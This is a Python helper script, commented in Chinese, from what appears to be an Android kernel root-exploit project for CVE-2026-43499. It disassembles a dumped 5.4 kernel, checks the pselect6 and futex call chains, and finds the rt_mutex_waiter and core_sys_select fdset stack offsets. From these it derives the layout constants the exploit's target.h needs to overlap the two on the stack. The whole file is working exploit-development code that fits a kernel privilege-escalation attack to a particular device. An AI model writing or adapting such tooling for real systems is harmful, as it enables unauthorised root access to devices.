#!/usr/bin/env python3
"""第 2 刀（偏移确定化）：手算推导 pfum10c48 内核的 pselect/futex 栈布局。

背景：target.h 头部自白无 BTF 生成——PSELECT_WAITER_WORD_SHIFT=0 与
WAITER_LOCAL_OFF=0x90 均为 rodin 模板继承值，从未在本内核反汇编上验证。
generate_target_2.derive_pselect_layout 为 GKI 6.x 写（查 waiter 的
pi_tree/wake_state 字段），本内核 5.4 rt_mutex_waiter 是
tree_entry/pi_tree_entry/task/lock/prio/deadline（无 wake_state）。

本脚本复用生成器的反汇编基础函数，用 5.4 实际布局手算：
  shift = (futex_waiter - pselect_word0) / 8
  pselect_word0 = -sum(pselect 链栈帧) + core_sys_select fdset buffer 偏移
  futex_waiter  = -sum(futex 链栈帧) + waiter_local
waiter 定位锚：add reg, sp, #imm 后跟 add reg2, reg, #0x18 (pi_tree_entry)。
"""
import sys
import tempfile
from pathlib import Path

REPO = Path("/home/yang1/Downloads/CVE-2026-43499-root-KernelSU")
sys.path.insert(0, str(REPO / "tools/vendor"))
import generate_target_2 as g

DUMP = REPO / "build/work/bootdump.img"
OBJDUMP = ("/home/yang1/android-ndk-r29/toolchains/llvm/prebuilt/"
           "linux-x86_64/bin/llvm-objdump")

# rt_mutex_waiter (sm6375-v15, CONFIG_DEBUG_RT_MUTEXES=n) member offsets
WT_TREE_ENTRY = 0x00
WT_PI_TREE_ENTRY = 0x18
WT_TASK = 0x30
WT_LOCK = 0x38
WT_PRIO = 0x40
WT_DEADLINE = 0x48

ROUTE_NFDS = g.PSELECT_ROUTE_NFDS  # 320


def main() -> int:
    boot = g.extract_boot_kernel(DUMP)
    kallsyms = g.recover_kallsyms(boot.kernel, boot.kernel_size, boot.image_size)

    with tempfile.TemporaryDirectory() as td:
        kp = Path(td) / "kernel.bin"
        kp.write_bytes(boot.kernel)

        names = {
            "pselect_wrapper": "__arm64_sys_pselect6",
            "pselect_core": "core_sys_select",
            "futex_wrapper": "__arm64_sys_futex",
            "futex_dispatch": "do_futex",
            # clang inlined futex_wait_requeue_pi into futex_wait on this
            # 5.4.254 build (no kallsyms entry); the waiter local lives in
            # futex_wait's frame.
            "futex_wait": "futex_wait",
        }
        has_do_pselect = bool(kallsyms.offsets_for("do_pselect"))
        if has_do_pselect:
            names["pselect_dispatch"] = "do_pselect"

        dis = {}
        for key, name in names.items():
            addr = kallsyms.one(name)
            stop = g.symbol_stop(kallsyms, addr, 0x2000)
            dis[key] = g.run_objdump(OBJDUMP, kp, addr, stop)
            print(f"{name:28s} @ link=0x{addr:x}  span=0x{stop - addr:x}")

        print("\n--- call-graph validation ---")
        pselect_chain = ["pselect_wrapper"]
        core_addr = kallsyms.one(names["pselect_core"])
        if g.has_direct_call(dis["pselect_wrapper"], core_addr):
            print("pselect6 -> core_sys_select (direct)")
        elif has_do_pselect and g.has_direct_call(
            dis["pselect_wrapper"], kallsyms.one("do_pselect")
        ):
            print("pselect6 -> do_pselect -> core_sys_select")
            pselect_chain.append("pselect_dispatch")
        else:
            print("!! pselect6 calls neither core_sys_select nor do_pselect")
            return 1
        pselect_chain.append("pselect_core")
        for wk, dk in zip(pselect_chain, pselect_chain[1:]):
            g.validate_frame_live_at(
                dis[wk], rf"\bbl\s+0x{kallsyms.one(names[dk]):x}\b", names[wk]
            )
        g.validate_frame_live_at(
            dis["futex_wrapper"],
            rf"\bbl\s+0x{kallsyms.one(names['futex_dispatch']):x}\b",
            names["futex_wrapper"],
        )
        g.validate_frame_live_at(
            dis["futex_dispatch"],
            rf"\bbl\s+0x{kallsyms.one(names['futex_wait']):x}\b",
            names["futex_dispatch"],
        )
        print("all chain frames live at call sites")

        frames = {key: g.first_sp_frame(text, names[key]) for key, text in dis.items()}
        print("\n--- stack frames (first sub sp,sp,#imm) ---")
        for key, size in frames.items():
            print(f"  {names[key]:28s} frame=0x{size:x}")

        # ---- waiter_local: add reg,sp,#imm ; add reg2,reg,#0x18 ----
        import re
        waiter_cands = []
        for reg, imm_text in re.findall(
            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
        ):
            imm = int(imm_text, 16)
            if re.search(
                rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{WT_PI_TREE_ENTRY:x}\b",
                dis["futex_wait"], re.I,
            ):
                waiter_cands.append((reg.lower(), imm))
        waiter_cands = list(dict.fromkeys(waiter_cands))
        print(f"\n--- waiter candidates (sp+imm then imm+0x{WT_PI_TREE_ENTRY:x}) ---")
        for reg, imm in waiter_cands:
            print(f"  {reg} = sp+0x{imm:x}")
        if len(waiter_cands) != 1:
            print("!! waiter candidate not unique -- cannot derive; dumping anchors")
            for anchor, off in (("task", WT_TASK), ("lock", WT_LOCK),
                                ("prio", WT_PRIO), ("deadline", WT_DEADLINE)):
                hits = re.findall(
                    rf"str\s+\w+,\s*\[sp,\s*#0x{(0x90 + off):x}\]", dis["futex_wait"], re.I
                )
                print(f"  [sp,#0x{0x90 + off:x}] ({anchor}) stores={len(hits)}")
            return 1
        waiter_reg, waiter_local = waiter_cands[0]
        g.validate_frame_live_at(
            dis["futex_wait"],
            rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
            names["futex_wait"],
        )
        # 5.4 cross-validation: real field stores through the waiter pointer
        print("\n--- waiter cross-validation (stores via waiter reg) ---")
        for anchor, off in (("task", WT_TASK), ("lock", WT_LOCK),
                            ("prio", WT_PRIO), ("deadline", WT_DEADLINE)):
            hits = len(re.findall(
                rf"\bstr\w*\s+\w+,\s*\[{re.escape(waiter_reg)},\s*#0x{off:x}\]",
                dis["futex_wait"], re.I,
            ))
            print(f"  [{waiter_reg}, #0x{off:x}] ({anchor}) stores={hits}")

        # ---- pselect fdset stack buffer ----
        add_sp = [
            (reg.lower(), int(imm, 16))
            for reg, imm in re.findall(
                r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["pselect_core"], re.I
            )
        ]
        buf_cands: set[int] = set()
        for reg, imm in add_sp:
            if not re.search(rf"\bmov\s+{re.escape(reg)},\s*x0\b",
                             dis["pselect_core"], re.I):
                continue
            peers = {peer for peer, peer_imm in add_sp
                     if peer_imm == imm and peer != reg}
            if any(
                re.search(rf"\bcmp\s+{re.escape(reg)},\s*{re.escape(peer)}\b",
                          dis["pselect_core"], re.I)
                or re.search(rf"\bcmp\s+{re.escape(peer)},\s*{re.escape(reg)}\b",
                             dis["pselect_core"], re.I)
                for peer in peers
            ):
                buf_cands.add(imm)
        print(f"\n--- core_sys_select fdset buffer candidates ---")
        for c in sorted(buf_cands):
            print(f"  sp+0x{c:x}")
        if len(buf_cands) != 1:
            print("!! buffer candidate not unique")
            return 1
        pselect_buffer = next(iter(buf_cands))

        fds_bytes = ((ROUTE_NFDS + 63) // 64) * 8
        thresholds = [int(x, 16) for x in re.findall(
            r"\bcmp\s+x\d+,\s*#0x([0-9a-f]+)", dis["pselect_core"], re.I)]
        route_ok = any(fds_bytes < t <= fds_bytes + 8 for t in thresholds)
        print(f"nfds={ROUTE_NFDS} fds_bytes=0x{fds_bytes:x} "
              f"threshold={sorted(hex(t) for t in thresholds)} "
              f"stack-route={'PROVEN' if route_ok else 'NOT PROVEN'}")

        pselect_word0 = -sum(frames[k] for k in pselect_chain) + pselect_buffer
        futex_waiter = (-frames["futex_wrapper"] - frames["futex_dispatch"]
                        - frames["futex_wait"] + waiter_local)
        delta = futex_waiter - pselect_word0
        shift = delta // 8 if delta % 8 == 0 else None

        print(f"\n--- result ---")
        print(f"  pselect_word0  = -sum(frames[{'+'.join(names[k] for k in pselect_chain)}])"
              f" + buffer"
              f" = -0x{sum(frames[k] for k in pselect_chain):x} + 0x{pselect_buffer:x}"
              f" = {pselect_word0}")
        print(f"  futex_waiter   = -0x{frames['futex_wrapper'] + frames['futex_dispatch'] + frames['futex_wait']:x}"
              f" + 0x{waiter_local:x} = {futex_waiter}")
        print(f"  delta          = {delta} (0x{delta & 0xffffffffffffffff:x})")
        print(f"\n  WAITER_LOCAL_OFF   derived={waiter_local:#x}   "
              f"target.h(rodin template)={0x90:#x}   "
              f"{'MATCH' if waiter_local == 0x90 else 'MISMATCH'}")
        print(f"  PSELECT_WAITER_WORD_SHIFT  derived={shift}   "
              f"target.h(rodin template)=0   "
              f"{'MATCH' if shift == 0 else 'MISMATCH'}")
        return 0


if __name__ == "__main__":
    sys.exit(main())
